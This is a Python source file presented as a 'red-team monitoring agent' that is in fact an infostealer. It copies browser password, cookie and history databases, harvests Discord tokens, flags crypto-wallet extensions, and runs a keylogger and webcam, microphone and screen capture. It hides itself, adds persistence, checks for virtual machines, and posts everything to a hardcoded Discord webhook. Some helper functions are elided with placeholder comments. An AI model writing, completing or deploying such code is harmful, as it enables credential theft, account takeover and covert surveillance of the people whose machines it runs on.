# =====================================================
# ULTIMATE RED-TEAM MONITORING AGENT v4.4 - REAL DB EXFIL
# =====================================================
import os
import sys
import time
import socket
import platform
import threading
import subprocess
import getpass
import ctypes
import base64
import json
import random
import shutil
import tempfile
from datetime import datetime
import win32gui
import requests
import psutil
import pyperclip
import cv2
import numpy as np
import sounddevice as sd
import wave
from pynput.keyboard import Listener as KeyboardListener
import pyautogui

# ================== CONFIG ==================
CONFIG_FILE = "config.json"
DEFAULT_WEBHOOK = "https://discord.com/api/webhooks/1504108072963014798/T6FC93tE6R8KYmeckjzuvsoTe_cdD6s8Acpo0IBgb6OqLvH54_1uBW9UKFdBPAZiAFx6"
INTERVAL = 25
SCREENSHOT_INTERVAL = 60
RECORD_DURATION = 20

LOG_FILE = os.path.join(os.getenv('APPDATA'), "WindowsUpdate.log")

def log(msg):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{datetime.now()}] {msg}\n")
    except:
        pass

BROWSER_PATHS = { ... }  # (same as your original - kept full)

def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE) as f:
                return json.load(f)
        except:
            pass
    return {"webhook": DEFAULT_WEBHOOK, "exfil_mode": "full", "encrypt": False, "send_dbs": True}

config = load_config()
WEBHOOK_URL = config.get("webhook", DEFAULT_WEBHOOK)
ENCRYPT = config.get("encrypt", False)
SEND_DBS = config.get("send_dbs", True)

def encrypt_data(data):
    key = b'labagent2025x'
    data = data.encode('utf-8')
    enc = bytearray()
    for i in range(len(data)):
        enc.append(data[i] ^ key[i % len(key)])
    return base64.b64encode(enc).decode('utf-8')

def stealth_mode():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        ctypes.windll.kernel32.SetConsoleTitleW("".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=15)))
    except:
        pass

def detect_vm():
    suspicious = ["vbox", "vmware", "sandbox", "debugger", "qemu", "virtual", "test"]
    hostname = socket.gethostname().lower()
    vm_score = sum(1 for x in suspicious if x in hostname)
    if psutil.cpu_percent(interval=1) < 15:
        vm_score += 2
    return vm_score >= 2, hostname

def add_persistence(script_path):  # (your original full persistence)
    # ... (same as v4.3)

# ================== STEAM STEALER (unchanged) ==================
def steal_steam_data():
    # (your full original function kept)
    ...

# ================== FULL BROWSER STEALER + REAL DB FILES ==================
def steal_browser_data():
    browser_data = {}
    db_files = {}  # files to attach: {"filename_on_discord": (real_path, content)}

    for browser, base_path in BROWSER_PATHS.items():
        if not os.path.exists(base_path):
            continue
        browser_data[browser] = {"profiles": {}}

        if browser == "Firefox":
            profiles = [d for d in os.listdir(base_path) if d.endswith('.default-release') or 'default' in d]
        else:
            profiles = ["Default"] + [d for d in os.listdir(base_path) if d.startswith("Profile")]

        for profile in profiles[:3]:  # limit to avoid spam
            profile_path = os.path.join(base_path, profile) if browser != "Firefox" else os.path.join(base_path, profile)
            if not os.path.exists(profile_path):
                continue

            p_data = {"passwords": "N/A", "cookies": "N/A", "history": "N/A", "discord_tokens": [], "crypto": []}

            # === REAL DB EXFIL ===
            temp_dir = tempfile.gettempdir()
            for db_name, db_file in [
                ("passwords", "Login Data"),
                ("cookies", "Network/Cookies" if browser != "Firefox" else "cookies.sqlite"),
                ("history", "History"),
                ("cookies", "cookies.sqlite" if browser == "Firefox" else None)
            ]:
                if not db_file: continue
                src = os.path.join(profile_path, db_file)
                if os.path.exists(src):
                    try:
                        # Copy because browser locks the file
                        dest = os.path.join(temp_dir, f"{browser}_{profile}_{db_name}.db")
                        shutil.copy2(src, dest)
                        key = f"{browser}_{profile}_{db_name}.db"
                        with open(dest, "rb") as f:
                            db_files[key] = (key, f.read(), "application/octet-stream")
                        p_data[db_name] = f"ATTACHED: {key} ({os.path.getsize(src)//1024} KB)"
                    except Exception as e:
                        p_data[db_name] = f"Locked / Error: {str(e)[:80]}"

            # Discord tokens + extensions (kept)
            leveldb_path = os.path.join(profile_path, "Local Storage", "leveldb")
            if os.path.exists(leveldb_path):
                for root, _, files in os.walk(leveldb_path):
                    for f in files:
                        if f.endswith((".log", ".ldb")):
                            try:
                                content = open(os.path.join(root, f), "r", errors="ignore").read()
                                if "mfa." in content or "token" in content.lower():
                                    p_data["discord_tokens"].append(content[:400])
                            except:
                                pass

            ext_path = os.path.join(profile_path, "Extensions")
            if os.path.exists(ext_path):
                p_data["extensions"] = [d for d in os.listdir(ext_path) if os.path.isdir(os.path.join(ext_path, d))][:10]
                for wallet in ["nkbihfbeogaeaoehlefnkodbefgpgknn", "fhbohimaelbohpjglknkikb", "ffnbelfdoe"]:
                    if wallet in str(p_data["extensions"]):
                        p_data["crypto"].append(wallet)

            browser_data[browser]["profiles"][profile] = p_data

    return browser_data, db_files

# ================== OTHER MODULES (same as before) ==================
# get_system_info, get_clipboard, get_wifi_passwords, keylogger, capture_webcam_and_mic, capture_screen_record, send_to_webhook...

def send_to_webhook(payload, files=None):
    try:
        r = requests.post(WEBHOOK_URL, json=payload, files=files, timeout=20)
        log(f"Webhook status: {r.status_code if r else 'fail'}")
    except Exception as e:
        log(f"Webhook error: {e}")

# ================== MAIN LOOP ==================
def main_loop(script_path):
    log("=== AGENT v4.4 STARTED - REAL DB EXFIL ===")
    add_persistence(script_path)
    stealth_mode()

    vm_detected, vm_name = detect_vm()
    if vm_detected:
        send_to_webhook({"embeds": [{"title": "🛡️ VM DETECTED", "description": vm_name, "color": 0xff0000}]})

    start_keylogger()

    ss_count = 0
    while True:
        try:
            info = get_system_info(vm_detected)
            info["clipboard"] = get_clipboard()
            info["wifi"] = get_wifi_passwords()
            info["steam"] = steal_steam_data()

            browser_info, db_attachments = steal_browser_data()
            info["browser"] = browser_info
            info["keylog"] = "".join(keylog_buffer[-300:]) or "N/A"

            if ENCRYPT:
                encrypted = encrypt_data(json.dumps(info, default=str))
                payload = {"embeds": [{"title": "🛡️ AGENT v4.4 - ENCRYPTED", "description": encrypted[:1900], "color": 0x9900ff}]}
            else:
                payload = {"content": "**AGENT v4.4 REPORT**```json\n" + json.dumps(info, default=str, indent=2)[:1900] + "\n```"}

            files = db_attachments.copy()   # ← REAL DB FILES ATTACHED

            # Screenshot + media every X cycles
            if ss_count % (SCREENSHOT_INTERVAL // INTERVAL) == 0:
                try:
                    shot = pyautogui.screenshot()
                    shot.save("screen.png")
                    files["screen.png"] = ("screen.png", open("screen.png","rb").read(), "image/png")
                    os.remove("screen.png")
                except:
                    pass

            if ss_count % 5 == 0:
                files.update(capture_webcam_and_mic())
                files.update(capture_screen_record())

            send_to_webhook(payload, files)
            ss_count += 1
            time.sleep(INTERVAL)
        except Exception as e:
            log(f"Loop error: {e}")
            time.sleep(INTERVAL)

# =============== START ===============
if __name__ == "__main__":
    stealth_mode()
    script_path = os.path.abspath(sys.argv[0])
    threading.Thread(target=main_loop, args=(script_path,), daemon=False).start()
    log("Main thread launched")
    while True:
        time.sleep(3600)
